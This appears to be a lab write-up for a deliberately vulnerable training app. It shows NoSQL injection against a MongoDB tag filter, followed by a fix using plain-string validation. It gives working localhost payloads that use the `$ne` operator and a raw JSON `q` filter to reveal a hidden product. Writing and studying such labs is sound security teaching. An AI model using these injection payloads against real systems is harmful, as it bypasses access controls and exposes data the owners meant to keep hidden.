# Lab 03b: NoSQL injection on tag filter

Product tags live in MongoDB. `/tags` builds a Mongo filter from query params, including operators and raw JSON.

**OWASP Top 10:2025:** [A05 Injection](https://owasp.org/Top10/2025/)

**Code:** `app/routes/shop.py` (`tags`); seed prize slug `internal-staff-hoodie` in `app/seed.py`

## Exploit

1. Normal filter (public hoodies only):

```text
http://localhost:8888/tags?tag=hoodie
```

2. Operator injection (Flask parses bracket keys):

```text
http://localhost:8888/tags?tag[$ne]=noop
```

3. Or pass a JSON filter via `q`:

```text
http://localhost:8888/tags?q={"tags":{"$ne":"x"}}
```

Results should include **`internal-staff-hoodie`**.

## Fix

Treat input as a plain string. Never pass client JSON or operator maps into `find()`:

```python
tag = request.args.get("tag", "").strip()
# validate allowlist / pattern, then:
docs = list(current_app.mongo.product_tags.find({"tags": tag}))
```

Do not accept `q` as a Mongo query document. See `SAFE:` comments in `shop.py`.
